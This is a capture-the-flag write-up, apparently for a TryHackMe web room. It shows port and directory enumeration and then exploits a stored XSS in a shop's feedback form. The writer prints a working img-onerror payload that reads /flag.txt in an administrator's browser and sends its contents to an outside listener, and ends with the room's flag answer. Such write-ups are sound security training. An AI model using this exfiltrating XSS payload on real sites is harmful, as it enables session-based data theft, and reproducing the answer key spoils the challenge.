---
created at: 2026-05-25
difficulty: Easy
---
## Room Description
Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

Can you read the flag at `http://MACHINE_IP:8080/flag.txt`?
## Solution
### 1. Reconnaissance & Enumeration
We begin by scanning ports using **nmap**:
```bash
nmap -sC -sV -oN nmap.logs $IP
```
The scan results reveal only two active services:
- **Port 22**: OpenSSH 8.2p1
- **Port 8080**: Werkzeug httpd 3.0.1 (Python 3.8.10) - hosting the "Cat Sticker Shop" web application

Next we perform directory discovery usinf **ffuf**:
```bash
$ ffuf -u http://$IP:8080/FUZZ -w ~/HDD/ctf_stuff/seclists/common.txt -e .php,.txt,.zip,.bkp -r -t 30
```
The fuzzer reveals one file:
```
/flag.txt
```
### Vulnerability Analysis
On this site we only have 3 pages: home page, page to leave a feedback and `flag.txt`
If we try read the `flag.txt` file we would get an error 401

On the page for feedback we can understand that a feedback we left is stored on a server
It means no **Reflected XSS** is possible, but it can be a **Stored XSS**

Lets try some payload so we can check is this page vulnerable to the **Stored XSS**
But before that lets start a local http server so we can see incoming requests:
```bash
python3 -m http.server 9090
```

And our payload:
```js
<img src=x onerror="fetch('http://192.168.141.232:9090')"/>
```

After a bit of time we can see that our http server detected request from a target server:
```bash
10.112.145.235 - - [25/May/2026 01:34:57] "GET / HTTP/1.1" 200 -
```

### 3. Exploitation
Since the XSS script executes within the context of the administrator's trusted browser session, we can write a payload that:
- Fetches the contents of /flag.txt (a Same-Origin request, which is not restricted by SOP/CORS).
- Transmits the retrieved content back to our listener via an Out-of-Band (OOB) HTTP request.
#### 1. Get a flag from url
```js
fetch('/flag.txt'.then(res => res.text))
```
#### 2. Send a GET request to us
```js
fetch('/flag.txt').then(res => res.text()).then(data => fetch(`http://192.168.141.232:9090/endpoint?flag=${data}`));
```
#### 3. Put in XSS payload
```js
<img src=x onerror="fetch('/flag.txt').then(res => res.text()).then(data => fetch(`http://192.168.141.232:9090/endpoint?flag=${data}`));"/>
```
## Questions
**Question #1.** What is flag.txt flag?
*Answer:* `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`